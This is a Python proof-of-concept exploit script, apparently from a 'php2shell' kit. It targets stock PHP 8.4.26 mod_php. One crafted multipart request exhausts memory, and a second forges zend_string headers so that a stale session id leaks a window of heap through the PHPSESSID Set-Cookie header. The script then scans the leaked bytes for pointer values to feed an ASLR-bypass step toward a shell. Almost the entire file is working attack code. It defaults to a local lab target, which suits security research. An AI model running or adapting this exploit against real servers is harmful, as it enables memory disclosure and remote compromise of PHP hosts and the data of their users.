#!/usr/bin/env python3
"""9bie A1/B1 leak probe — stale-id OOB read on stock 8.4.26 mod_php.

This is the *other* public leak primitive (9bie/php2shell-bypass-aslr-exp:
pure/mk_a1.py + pure/mk_leak_b.py). Unlike the dinosn PS(id) cookie, it:

  A1  exhausts memory during the END cleanup with 860 depth-64 nested empty
      file parts, 78 x 8000-byte fields, 20 x 4000-byte fields and a
      4000-byte progress value; PHPSESSID is a single NUL.
  B1  forges a zend_string header inside a large value so the stale PS(id)
      is read as a 0x2000-byte string; `Set-Cookie: PHPSESSID=` then carries
      a URL-encoded window of the adjacent heap.

It needs worker pinning (A1 and B1 must hit the same child) and no
display_errors. Target: lab-pure-modphp `php8m` (:18111, 128M/8M).

Usage:
  python3 poc/verify_a1b1_leak.py --target http://127.0.0.1:18111 --holders 3
"""

import argparse
import os
import re
import struct
import sys
from urllib.parse import unquote_to_bytes

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import probe
from php2shell.pinning import WorkerPinner

BOUNDARY = b"C" * 10


def _part(out, name, value=b"", filename=None, ctype=None):
    out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value + b"\r\n")


def a1_body(parts=860, depth=64, key_pad=90, fillers128=14, big=78,
            big_len=8000, burners=20, burner_len=4000, progress_len=4000):
    out = bytearray()

    def nest(i):
        return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)

    _part(out, b"PHPSESSID", b"\x00")
    for i in range(parts):
        ctype = (b"C" * 103 if i == 0 else b"C" * 231 if i == 1
                 else b"application/octet-stream")
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   nest(i) + b"\"")
        out.extend(b"; filename=\"A\"" if i < 2 else b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(fillers128):
        _part(out, ("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        _part(out, ("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        _part(out, ("u%02d" % i).encode(), b"U" * burner_len)
    _part(out, b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def _value_pages(pages, fill):
    return fill * (pages * 4096 - 25)


def _tag8(idx, tagged):
    return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB" if tagged else b"BBBB/BBB"


def _forge_value(pages, page, fake_len, idx=0, tagged=False):
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def _forge_fill(pages, page, fake_len, idx=0, tagged=False):
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return bytes(v)


def _progress_forge(page, fake_len):
    D = page * 0x1000 - 0x1018
    voff = D - 16
    v = bytearray(b"K" * (voff + 0x18 + 8))
    struct.pack_into("<I", v, voff + 0x00, 0)
    struct.pack_into("<I", v, voff + 0x04, 0x16)
    struct.pack_into("<Q", v, voff + 0x08, 0)
    struct.pack_into("<Q", v, voff + 0x10, fake_len)
    v[voff + 0x18:voff + 0x18 + 8] = b"/99BBBBB"
    return bytes(v)


def b1_body(spec="F:501,F:501,A:0x137,A:0x137", sid=b"a", progress=b"k0",
            name_len=120, fake_len=0x2000):
    out = bytearray()

    def part(name, value):
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    has_p = any(it.partition(":")[0] == "P" for it in spec.replace(",", " ").split())
    if not has_p:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    idx = 0
    for item in spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            v = _value_pages(int(arg, 0), b"A" if kind == "F" else b"S")
        elif kind == "A":
            v = _forge_value(0, int(arg, 0), fake_len, idx)
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _forge_fill(int(pages_s, 0), int(page_s, 0), fake_len, idx)
        elif kind == "P":
            part(b"PHP_SESSION_UPLOAD_PROGRESS",
                 _progress_forge(int(arg, 0), fake_len))
            idx += 1
            continue
        elif kind == "X":
            for _ in range(int(arg, 0)):
                part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            raise SystemExit(f"bad spec item {item!r}")
        part(("f%04d" % idx).encode().ljust(name_len, b"f")[:name_len], v)
        idx += 1
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def parse_cookie(resp):
    for line in probe.header_lines(resp):
        if line.lower().startswith("set-cookie:"):
            val = line.split(":", 1)[1].strip()
            if val.lower().startswith("phpsessid="):
                raw = val.split(";", 1)[0].split("=", 1)[1]
                return raw, unquote_to_bytes(raw)
    return None, None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18111")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--holders", type=int, default=3)
    ap.add_argument("--spec", default="F:501,F:501,A:0x137,A:0x137")
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0x2000)
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    a = a1_body()
    b = b1_body(args.spec, fake_len=args.fake_len)
    print("[*] 9bie A1/B1 stale-id leak probe")
    print(f"    target: {host}:{port}  holders: {args.holders}")
    print(f"    A1 body={len(a)} B  B1 body={len(b)} B")
    print()

    with WorkerPinner(host, port, holders=args.holders):
        print("[1] A1 (END-cleanup OOM, PHPSESSID=NUL) ...")
        ra = probe.http_post(host, port, args.path, a,
                             headers={"Content-Type": "multipart/form-data; boundary=CCCCCCCCCC"},
                             timeout=120, recv_timeout=120)
        print(f"    {probe.status(ra)}  body={len(probe.body(ra))} B")
        print("[2] B1 (forged zend_string, stale PS(id) read) ...")
        rb = probe.http_post(host, port, args.path, b,
                             headers={"Content-Type": "multipart/form-data; boundary=CCCCCCCCCC"},
                             timeout=120, recv_timeout=120)
        print(f"    {probe.status(rb)}  body={len(probe.body(rb))} B")

    raw, decoded = parse_cookie(rb)
    print()
    if raw is None:
        print("[!] no PHPSESSID Set-Cookie on B1")
        print("    Wiz observed the same failure shape for the current kit:")
        print("    A1 exhausts memory, B1 does not leak. Try a different")
        print("    --spec / --fake-len, or a build-matched heap calibration.")
        return 1
    print(f"    cookie raw={len(raw)} B decoded={len(decoded)} B")
    print(f"    prefix={raw[:160]!r}")
    if len(decoded) >= 64:
        print()
        print("[EVIDENCE] A1/B1 STALE-ID COOKIE DISCLOSURE")
        print(f"    - B1 returned {len(decoded)} bytes of decoded heap in")
        print("      PHPSESSID, versus a 32-char normal id;")
        print("    - this is the 9bie leak primitive, in-band, on stock")
        print("      mod_php with display_errors=Off.")
        # qword scan for candidate bases
        qs = []
        for off in range(0, len(decoded) - 7):
            (q,) = struct.unpack_from("<Q", decoded, off)
            if 0x7F0000000000 <= q < 0x800000000000:
                qs.append(q)
        print(f"    - {len(qs)} user-space qwords in the window; feed them to")
        print("      php2shell.leak.derive() with the build offset profile.")
        return 0
    print("[!] cookie is not longer than a normal id — no disclosure in this run")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
